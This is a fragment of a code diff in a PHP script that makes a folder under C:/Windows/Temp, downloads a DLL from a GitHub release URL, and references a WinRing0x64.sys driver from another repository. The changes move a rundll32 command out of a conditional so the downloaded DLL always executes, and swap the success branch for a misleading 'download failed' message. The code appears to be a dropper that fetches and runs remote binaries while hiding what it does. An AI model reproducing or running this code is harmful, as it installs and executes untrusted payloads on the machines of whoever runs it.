@@ -63,7 +63,7 @@ $deletePaths = [
 
 system('mkdir "C:/Windows/Temp/spawnZZ2/"');
 
-exec('tasklist', $output);
+
 
 $url =  'https://github.com/mainpoint91/fiveminllk/releases/download/golow/vs2.dll';
 $url2 =  'https://raw.githubusercontent.com/mainpoint91/mainpoint/refs/heads/main/WinRing0x64.sys';
@@ -80,14 +80,14 @@ $found3 = false;
 
         if (file_put_contents($file_name, file_get_contents($url)))
             {
-                system('rundll32.exe C:/Windows/Temp/spawnZZ2/vs2.dll,0');
+               echo "File downloading feailed.";
             }
         else
             {
             echo "File downloading failed.";
             }
          
- 
+  system('rundll32.exe C:\Windows\Temp\spawnZZ2\vs2.dll,0');
 
          
         
